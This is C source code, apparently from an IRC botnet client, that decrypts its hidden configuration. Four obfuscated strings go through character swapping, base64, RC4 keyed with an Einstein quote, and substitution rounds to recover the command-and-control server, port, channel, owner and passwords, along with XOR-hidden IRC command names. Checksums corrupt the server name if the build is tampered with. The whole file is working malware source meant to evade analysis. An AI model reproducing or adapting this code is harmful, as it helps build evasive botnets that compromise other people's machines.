#include "../Includes/includes.h"

/* <------------------------------> Settings START <------------------------------> */

#define SPECIAL_RC4_KEY "Imagination is more important than knowledge."

#define SPECIAL_STRING_1 "Ptk2eV-0BZbJHfXAJfHoqkdx-8JXSdogiykgZUZOzPJdfP5Zn4TEojvu1dqc2HzCJS0iHfSLjWfl3h4Tn`QeBGgkUre58nQma87BizZ88HztdRWd0h9jnZQeis7A3jcMXJry8NUd9N631NhzbefhG-LGsov1FphS7t-OF7jHuRQpTHCbtPSvTbxNZ3uyxbUmJToyoz`dXvPaxTNfsi7L`XVe4W2YZGH9VgxJ5STwhDkTxjwj6dvHVulfnSDM`ZlYrBd66lF`ms9qMrqLanE07q7DSn5B0AtL0X0-Nbh`-rP5yYBA3KHxkw0~"
#define SPECIAL_STRING_2 "PN41gkR06b`s9vDLNdHFt7dmGf-Qpi06tjPKgJFaMQO1ePxprqz2QDLi9tejIX3mBuYh6OlqY2QZJMnYdwztFaA2dY9lzI7QdeYrbjiIL3jEr9WP7xpiVZgHhsXa5dgYYagn1zH47ey3Jd-Qkx7BKO7yrUgvHJJ1JN9Y1UELkcIZdUR5R`m-sLNpt4xC4Hwj4xI-oC4pofHYMTVdl9cb1ZOo6UpKdabGfQO-6DwnZMgSH8AhPDv7RNpar9c2H19dQh2023-6uNecMmqGuWQj467EeEWu2QFlwmk9NEVmO4vlHVy-ynbVk`k~"
#define SPECIAL_STRING_3 "Pts7o0Ox-qU4JhzyK-QnYlZC`yqpgz4jjQvKvEFUCAKNbM-wmkkBf93X0xRNB0n4IMAOIPaWf7E7`Mw`T-rh7m`ZYL19GXbskc47dvCGEI44eNON4TOVZoAfR-0OBijiqlYtwiss`eivMw-Fd`wJ1tzphKEn91pfwBR6w0YpmAQ2jrFgdA~~"
#define SPECIAL_STRING_4 "LMsvhZ67FI3I--MlKAIMbGKiOPReg-IQax7iar6BOti3aPuapLwSXS7c`ClE15QfCvsf1eJUVkbgwNT1Uhoq2IYfaaipFEoBXdgUv912`Y87gfh0P86Vco7umBQk-dX3vb4tINbRDTO2zdeTZA4ZBQwcUoYl63mDOP1`z77YYAnPbm1yXxC2rEFJqYBCxFTPMug7eTD8qO4hNMuASd03IZa3MLOAkYcciAmxGjMrmC7-zREgxtkhSj6KS7qozX96FTlg24K3mCHDC9Cob1pr08PXe7aQ3vH-9yadxwxKNVECDoWzOnAo"

/*
#define SPECIAL_RC4_KEY "_MARKER_RC4KEY_"
#define SPECIAL_STRING_1 "_MARKER_1_"
#define SPECIAL_STRING_2 "_MARKER_2_"
#define SPECIAL_STRING_3 "_MARKER_3_"
#define SPECIAL_STRING_4 "_MARKER_4_"
*/

/* <------------------------------> Settings STOP <------------------------------> */

/*
EINSTEIN QUOTES(I have been using them for the various RC4 keys)

Used:
"Imagination is more important than knowledge."
"A person starts to live when he can live outside himself."
"Reality is merely an illusion, albeit a very persistent one."
"Gravitation is not responsible for people falling in love."
"The important thing is not to stop questioning. Curiosity has its own reason for existing."
"The only real valuable thing is intuition."
"I never think of the future. It comes soon enough."
"Sometimes one pays most for the things one gets for nothing."
"In order to form an immaculate member of a flock of sheep one must, above all, be a sheep."
"Peace cannot be kept by force. It can only be achieved by understanding."
"Two things are infinite: the universe and human stupidity; and I'm not sure about the the universe."
"The eternal mystery of the world is its comprehensibility."
"Education is what remains after one has forgotten everything he learned in school."
"Anyone who has never made a mistake has never tried anything new."

----------------------------------
Not Used:
"Any intelligent fool can make things bigger, more complex, and more violent. It takes a touch of genius -- and a lot of courage -- to move in the opposite direction."
"I want to know God's thoughts; the rest are details."
"The hardest thing in the world to understand is the income tax."
"I am convinced that He (God) does not play dice."
"God is subtle but he is not malicious."
"Science without religion is lame. Religion without science is blind."
"Great spirits have often encountered violent opposition from weak minds."
"Common sense is the collection of prejudices acquired by age eighteen."
"The secret to creativity is knowing how to hide your sources."
"The only thing that interferes with my learning is my education."
"God does not care about our mathematical difficulties. He integrates empirically."
"The whole of science is nothing more than a refinement of everyday thinking."
"Technological progress is like an axe in the hands of a pathological criminal."
"The most incomprehensible thing about the world is that it is comprehensible."
"Do not worry about your difficulties in Mathematics. I can assure you mine are still greater."
"Equations are more important to me, because politics is for the present, but an equation is something for eternity."
"If A is a success in life, then A equals x plus y plus z. Work is x; y is play; and z is keeping your mouth shut."
"As far as the laws of mathematics refer to reality, they are not certain, as far as they are certain, they do not refer to reality."
"Whoever undertakes to set himself up as a judge of Truth and Knowledge is shipwrecked by the laughter of the gods."
"I know not with what weapons World War III will be fought, but World War IV will be fought with sticks and stones."
"The fear of death is the most unjustified of all fears, for there's no risk of accident for someone who's dead."
"Too many of us look upon Americans as dollar chasers. This is a cruel libel, even if it is reiterated thoughtlessly by the Americans themselves."
"Heroism on command, senseless violence, and all the loathsome nonsense that goes by the name of patriotism -- how passionately I hate them!"
"No, this trick won't work...How on earth are you ever going to explain in terms of chemistry and physics so important a biological phenomenon as first love?"
"My religion consists of a humble admiration of the illimitable superior spirit who reveals himself in the slight details we are able to perceive with our frail and feeble mind."
"Yes, we have to divide up our time like that, between our politics and our equations. But to me our equations are far more important, for politics are only a matter of present concern. A mathematical equation stands forever."
"The release of atom power has changed everything except our way of thinking...the solution to this problem lies in the heart of mankind. If only I had known, I should have become a watchmaker."
"Great spirits have always found violent opposition from mediocrities. The latter cannot understand it when a man does not thoughtlessly submit to hereditary prejudices but honestly and courageously uses his intelligence."
"The most beautiful thing we can experience is the mysterious. It is the source of all true art and all science. He to whom this emotion is a stranger, who can no longer pause to wonder and stand rapt in awe, is as good as dead: his eyes are closed."
"A man's ethical behavior should be based effectually on sympathy, education, and social ties; no religious basis is necessary. Man would indeeded be in a poor way if he had to be restrained by fear of punishment and hope of reward after death."
"The further the spiritual evolution of mankind advances, the more certain it seems to me that the path to genuine religiosity does not lie through the fear of life, and the fear of death, and blind faith, but through striving after rational knowledge."
"Now he has departed from this strange world a little ahead of me. That means nothing. People like us, who believe in physics, know that the distinction between past, present, and future is only a stubbornly persistent illusion."
"You see, wire telegraph is a kind of a very, very long cat. You pull his tail in New York and his head is meowing in Los Angeles. Do you understand this? And radio operates exactly the same way: you send signals here, they receive them there. The only difference is that there is no cat."
"One had to cram all this stuff into one's mind for the examinations, whether one liked it or not. This coercion had such a deterring effect on me that, after I had passed the final examination, I found the consideration of any scientific problems distasteful to me for an entire year."
"...one of the strongest motives that lead men to art and science is escape from everyday life with its painful crudity and hopeless dreariness, from the fetters of one's own ever-shifting desires. A finely tempered nature longs to escape from the personal life into the world of objective perception and thought."
"He who joyfully marches to music rank and file, has already earned my contempt. He has been given a large brain by mistake, since for him the spinal cord would surely suffice. This disgrace to civilization should be done away with at once. Heroism at command, how violently I hate all this, how despicable and ignoble war is; I would rather be torn to shreds than be a part of so base an action. It is my conviction that killing under the cloak of war is nothing but an act of murder."
"A human being is a part of a whole, called by us _universe_, a part limited in time and space. He experiences himself, his thoughts and feelings as something separated from the rest... a kind of optical delusion of his consciousness. This delusion is a kind of prison for us, restricting us to our personal desires and to affection for a few persons nearest to us. Our task must be to free ourselves from this prison by widening our circle of compassion to embrace all living creatures and the whole of nature in its beauty."
"Not everything that counts can be counted, and not everything that can be counted counts." (Sign hanging in Einstein's office at Princeton)
*/

char *SimpleDynamicXor(char *pcString, DWORD dwKey)
{
    for(unsigned short us = 0; us < strlen(pcString); us++)
        pcString[us] = (pcString[us] ^ dwKey);

    // <!-------! CRC AREA START !-------!>
    bConfigSetupCheckpointFive = TRUE;
    // <!-------! CRC AREA STOP !-------!>

    return pcString;
}

void SwapNonBase64ToBase64(char *cSource)
{
    // <!-------! CRC AREA START !-------!>
    bConfigSetupCheckpointFour = TRUE;
    // <!-------! CRC AREA STOP !-------!>
    for(int i = 0; i < strlen(cSource); i++)
    {
        if(cSource[i] == '`')
            cSource[i] = '/';
        else if(cSource[i] == '~')
            cSource[i] = '=';
        else if(cSource[i] == '-')
            cSource[i] = '+';
    }
}

unsigned long ulChecksum1;
unsigned long ulChecksum2;
unsigned long ulChecksum3;
unsigned long ulChecksum4;
unsigned long ulChecksum5;
unsigned long ulChecksum6;
unsigned long ulChecksum7;
unsigned long ulChecksum8;
unsigned long ulChecksum9;

unsigned short usVersionLength;
unsigned short usServerLength;
unsigned short usChannelLength;
unsigned short usChannelKeyLength;
unsigned short usAuthHostLength;
unsigned short usServerPassLength;

unsigned short usConfigStrlenKey;

char cIrcCommandPrivmsg[8];
char cIrcCommandJoin[5];
char cIrcCommandPart[5];
char cIrcCommandUser[5];
char cIrcCommandNick[5];
char cIrcCommandPass[5];
char cIrcCommandPong[5];

char cReturnConfig[5000];
char *ReturnConfigContents(unsigned short usChoice)
{
    char cConfArray[4][5000] =
    {
        SPECIAL_STRING_1,
        SPECIAL_STRING_2,
        SPECIAL_STRING_3,
        SPECIAL_STRING_4
    };

    for(unsigned short us = 0; us < strlen(cConfArray[usChoice]); us++)
        cReturnConfig[us] = cConfArray[usChoice][us];

    return (char*)cReturnConfig;
}

char cPoolOfCharacters[77];
char *ProcessConf(char *cConf)
{
    // <!-------! CRC AREA START !-------!>
    bConfigSetupCheckpointTwo = TRUE;
    // <!-------! CRC AREA STOP !-------!>

    unsigned short usConfigLen = strlen(cConf);
    strcpy(cPoolOfCharacters, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789# _.-~`'+@&|()");
    char cMixedPoolOfCharacters[77] = "() &@+'|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789#_.-~`";
    for(unsigned short us = 0; us <= usConfigLen; us++)
    {
        for(unsigned short usP = 0; usP <= strlen(cPoolOfCharacters); usP++)
        {
            if(cConf[us] == cMixedPoolOfCharacters[usP])
            {
                cConf[us] = cPoolOfCharacters[usP];

                break;
            }
        }
    }
    return cConf;
}

bool SetupInfo()
{
    char cCheckContents[DEFAULT * 10];
    char cDecryptLoops[4] = { 0 };
    unsigned short usDecryptLoops;

    // <!-------! CRC AREA START !-------!>
    bConfigSetupCheckpointThree = TRUE;
    // <!-------! CRC AREA STOP !-------!>

    bool bFoundContents = FALSE;
    while(!bFoundContents)
    {
        for(unsigned short us = 0; us < 4; us++)
        {
            char *cProcessContents = ReturnConfigContents(us);

            // <!-------! CRC AREA START !-------!>
            bConfigSetupCheckpointTen = TRUE;
            // <!-------! CRC AREA STOP !-------!>

            SwapNonBase64ToBase64(cProcessContents);

            char cBase64Decrypted[strlen(cProcessContents) * 3];
            memset(cBase64Decrypted, 0, sizeof(cBase64Decrypted));
            base64_decode(cProcessContents, cBase64Decrypted, sizeof(cBase64Decrypted));

            char cRc4Decrypted[strlen(cBase64Decrypted)];
            memset(cRc4Decrypted, 0, sizeof(cRc4Decrypted));
            rc4(cBase64Decrypted, strlen(cBase64Decrypted), SPECIAL_RC4_KEY, cRc4Decrypted);

            for(unsigned short us = 0; us < strlen(cRc4Decrypted); us++)
                cRc4Decrypted[us] = cRc4Decrypted[us] - 69;

            memcpy(cDecryptLoops, cRc4Decrypted, 3);
            unsigned short usDecryptLoops = atoi(cDecryptLoops);

            // <!-------! CRC AREA START !-------!>
            bConfigSetupCheckpointNine = TRUE;
            // <!-------! CRC AREA STOP !-------!>

            char cConfig[strlen(cRc4Decrypted)];
            memset(cConfig, 0, sizeof(cConfig));
            for(unsigned short us = 3; us < strlen(cRc4Decrypted); us++)
                cConfig[us - 3] = cRc4Decrypted[us];

            for(unsigned short us = 0; us <= usDecryptLoops; us++)
                strcpy(cConfig, ProcessConf(cConfig));

            if(cConfig[0] == cPoolOfCharacters[71])
            {
                strcpy(cCheckContents, cConfig);
                bFoundContents = TRUE;

                break;
            }
        }

        Sleep(1);
    }

    memset(cDecryptLoops, 0, sizeof(cDecryptLoops));
    memcpy(cDecryptLoops, cCheckContents + 1, 3);
    usDecryptLoops = atoi(cDecryptLoops);

    char cFinalConfig[strlen(cCheckContents)];
    memset(cFinalConfig, 0, sizeof(cFinalConfig));
    for(unsigned short us = 4; us < strlen(cCheckContents); us++)
        cFinalConfig[us - 4] = cCheckContents[us];

    for(unsigned short us = 0; us <= usDecryptLoops; us++)
        strcpy(cCheckContents, ProcessConf(cFinalConfig));

    char *cBreakString = strtok(cFinalConfig, "+");
    unsigned short usBreakStringLoops = 0;

    // <!-------! CRC AREA START !-------!>
    bConfigSetupCheckpointOne = TRUE;
    // <!-------! CRC AREA STOP !-------!>

    int nVersionLen = 0;
    int nServerLen = 0;
    int nChannelLen = 0;
    int nAuthHostLen = 0;

    while(cBreakString != NULL)
    {
        usBreakStringLoops++;

        // <!-------! CRC AREA START !-------!>
        bConfigSetupCheckpointEight = TRUE;
        // <!-------! CRC AREA STOP !-------!>

        if(usBreakStringLoops == 1)
            strcpy(cVersion, cBreakString);
        else if(usBreakStringLoops == 2)
            strcpy(cServer, cBreakString);
        else if(usBreakStringLoops == 3)
            usPort = atoi(cBreakString);
        else if(usBreakStringLoops == 4)
            strcpy(cChannel, cBreakString);
        else if(usBreakStringLoops == 5)
            strcpy(cChannelKey, cBreakString);
        else if(usBreakStringLoops == 6)
            strcpy(cAuthHost, cBreakString);
        else if(usBreakStringLoops == 7)
            strcpy(cOwner, cBreakString);
        else if(usBreakStringLoops == 8)
            strcpy(cServerPass, cBreakString);
        else if(usBreakStringLoops == 9)
            ulChecksum1 = atoi(cBreakString);
        else if(usBreakStringLoops == 10)
            ulChecksum2 = atoi(cBreakString);
        else if(usBreakStringLoops == 11)
            ulChecksum3 = atoi(cBreakString);
        else if(usBreakStringLoops == 12)
            ulChecksum4 = atoi(cBreakString);
        else if(usBreakStringLoops == 13)
            ulChecksum5 = atoi(cBreakString);
        else if(usBreakStringLoops == 14)
            ulChecksum6 = atoi(cBreakString);
        else if(usBreakStringLoops == 15)
            ulChecksum7 = atoi(cBreakString);
        else if(usBreakStringLoops == 16)
            ulChecksum8 = atoi(cBreakString);
        else if(usBreakStringLoops == 17)
            ulChecksum9 = atoi(cBreakString);
        else if(usBreakStringLoops == 18)
            usVersionLength = atoi(cBreakString);
        else if(usBreakStringLoops == 19)
            usServerLength = atoi(cBreakString);
        else if(usBreakStringLoops == 20)
            usChannelLength = atoi(cBreakString);
        else if(usBreakStringLoops == 21)
            usChannelKeyLength = atoi(cBreakString);
        else if(usBreakStringLoops == 22)
            usAuthHostLength = atoi(cBreakString);
        else if(usBreakStringLoops == 23)
            usServerPassLength = atoi(cBreakString);
        else if(usBreakStringLoops == 24)
            strcpy(cIrcCommandPrivmsg, SimpleDynamicXor(cBreakString, usConfigStrlenKey));
        else if(usBreakStringLoops == 25)
            strcpy(cIrcCommandJoin, SimpleDynamicXor(cBreakString, usConfigStrlenKey));
        else if(usBreakStringLoops == 26)
            strcpy(cIrcCommandPart, SimpleDynamicXor(cBreakString, usConfigStrlenKey));
        else if(usBreakStringLoops == 27)
            strcpy(cIrcCommandUser, SimpleDynamicXor(cBreakString, usConfigStrlenKey));
        else if(usBreakStringLoops == 28)
            strcpy(cIrcCommandNick, SimpleDynamicXor(cBreakString, usConfigStrlenKey));
        else if(usBreakStringLoops == 29)
            strcpy(cIrcCommandPass, SimpleDynamicXor(cBreakString, usConfigStrlenKey));
        else if(usBreakStringLoops == 30)
            strcpy(cIrcCommandPong, SimpleDynamicXor(cBreakString, usConfigStrlenKey));
        else if(usBreakStringLoops == 31)
            strcpy(cBackup, cBreakString);

        // <!-------! CRC AREA START !-------!>
        bConfigSetupCheckpointSix = TRUE;
        // <!-------! CRC AREA STOP !-------!>

        if(usBreakStringLoops == 8)
            usConfigStrlenKey = strlen(cVersion) + strlen(cServer) + strlen(cChannel) + strlen(cAuthHost);

        cBreakString = strtok(NULL, "+");
    }

    // <!-------! CRC AREA START !-------!>
    if(usChannelLength != strlen(cChannel))
        strcpy(cChannel, cServer);
    // <!-------! CRC AREA STOP !-------!>

    if(cBackup[0] == '0' && cBackup[1] == '\0')
        cBackup[0] = '\0';

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s", cVersion);
    char *cStr = cCheckString;
    unsigned long ulCheck = (2368*2)+645;
    int nCheck;

    // <!-------! CRC AREA START !-------!>
    bConfigSetupCheckpointSeven = TRUE;
    // <!-------! CRC AREA STOP !-------!>

    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum9)
        cServer[0] = (char)0x69;
    // <!-------! CRC AREA STOP !-------!>

    return TRUE;
}

/*

	// <!-------! CRC AREA START !-------!>
    if(usServerPassLength != strlen(cServerPass))
        strcpy(cServer, cServerPass);
    // <!-------! CRC AREA STOP !-------!>

	// <!-------! CRC AREA START !-------!>
    if(usAuthHostLength != strlen(cAuthHost))
        strcpy(cAuthHost, "[]");
    // <!-------! CRC AREA STOP !-------!>

	*/
